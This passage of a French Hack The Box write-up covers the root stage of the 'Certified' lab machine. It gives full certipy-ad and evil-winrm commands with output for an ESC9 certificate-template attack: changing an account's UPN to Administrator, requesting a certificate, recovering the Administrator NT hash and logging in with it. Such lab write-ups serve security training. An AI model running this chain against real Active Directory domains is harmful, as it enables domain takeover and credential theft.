ESC9, ADCS template abuse Par le nom de la machine et en remarquant que ADCS est actif sur la machine, nous pouvons clairement déduire que la partie root va concerner les certificats ADCS. 1 2 3 4 5 6 $ nxc ldap 10.10.11.41 -u management_svc -H a\u0026lt;...\u0026gt;4 -M adcs SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.41 389 DC01 [+] certified.htb\\management_svc:a\u0026lt;...\u0026gt;4 ADCS 10.10.11.41 389 DC01 [*] Starting LDAP search with search filter \u0026#39;(objectClass=pKIEnrollmentService)\u0026#39; ADCS 10.10.11.41 389 DC01 Found PKI Enrollment Server: DC01.certified.htb ADCS 10.10.11.41 389 DC01 Found CN: certified-DC01-CA En utilisant certipy-ad, nous pouvons trouver une vulnérabilité sur le template CertifiedAuthentication. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ certipy-ad find -u \u0026#39;ca_operator@certified.htb\u0026#39; -hashes b\u0026lt;...\u0026gt;2 -dc-ip \u0026#39;10.10.11.41\u0026#39; -vulnerable Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;certified-DC01-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20250313205721_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20250313205721_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20250313205721_Certipy.json\u0026#39; $ cat 20250313205721_Certipy.txt \u0026lt;...\u0026gt; Template Name : CertifiedAuthentication Display Name : Certified Authentication \u0026lt;...\u0026gt; [!] Vulnerabilities ESC9 : \u0026#39;CERTIFIED.HTB\\\\operator ca\u0026#39; can enroll and template has no security extension \u0026lt;...\u0026gt; En utilisant le chemin d\u0026rsquo;attaque figurant sur thehacker.recipes pour ESC9, nous pouvons compromettre le compte administrateur du domaine.\nNous possédons déjà le NT hash de ca_operator donc nous pouvons changer son attribut userPrincipalName pour Administrator. 1 2 3 4 5 6 $ certipy-ad account update -username \u0026#34;management_svc@certified.htb\u0026#34; -hashes a\u0026lt;...\u0026gt;4 -user ca_operator -upn Administrator Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_operator\u0026#39;: userPrincipalName : Administrator [*] Successfully updated \u0026#39;ca_operator\u0026#39; Ensuite, nous pouvons demander un certificat d\u0026rsquo;authentification en tant que ca_operator en utilisant le template vulnérable.\nLes valeurs de ca et template peuvent être trouvées dans le .txt généré ultérieurement. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ cat 20250313205721_Certipy.txt \u0026lt;...\u0026gt; Certificate Templates 0 Template Name : CertifiedAuthentication Display Name : Certified Authentication Certificate Authorities : certified-DC01-CA \u0026lt;...\u0026gt; $ certipy-ad req -username \u0026#34;ca_operator@certified.htb\u0026#34; -hashes b\u0026lt;...\u0026gt;2 -target \u0026#34;10.10.11.41\u0026#34; -ca \u0026#39;certified-DC01-CA\u0026#39; -template \u0026#39;CertifiedAuthentication\u0026#39; Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 7 [*] Got certificate with UPN \u0026#39;Administrator\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; Dernièrement, nous pouvons rechanger le userPrincipalName ca_operator pour lui même et ensuite obtenir le NT hash d\u0026rsquo;Administrator en utilisant le fichier administrator.pfx généré. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ certipy-ad account update -username \u0026#34;management_svc@certified.htb\u0026#34; -hashes a\u0026lt;...\u0026gt;4 -user ca_operator -upn \u0026#34;ca_operator@certified.htb\u0026#34; -dc-ip 10.10.11.41 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_operator\u0026#39;: userPrincipalName : ca_operator@certified.htb [*] Successfully updated \u0026#39;ca_operator\u0026#39; $ certipy-ad auth -pfx \u0026#39;administrator.pfx\u0026#39; -domain \u0026#34;certified.htb\u0026#34; Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@certified.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@certified.htb\u0026#39;: a\u0026lt;...\u0026gt;e:0\u0026lt;...\u0026gt;4 Avec ce hash, nous pouvons récupérer le flag root via evil-winrm. 1 2 3 4 5 $ evil-winrm -i 10.10.11.41 -u Administrator -H 0\u0026lt;...\u0026gt;4 \u0026lt;...\u0026gt; Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 3/13/2025 2:54 PM 34 root.txt Ressources thehacker.recipes - certificate templates\n","date":"2025-03-15T00:00:00Z","image":"https://01MI.github.io/p/certified-htb-writeup-windows-medium/Certified_hu_7767539059846492.PNG","permalink":"https://01MI.github.io/fr/p/certified-htb-writeup-windows-medium/","title":"Certified - Windows Medium - HTB Writeup"}]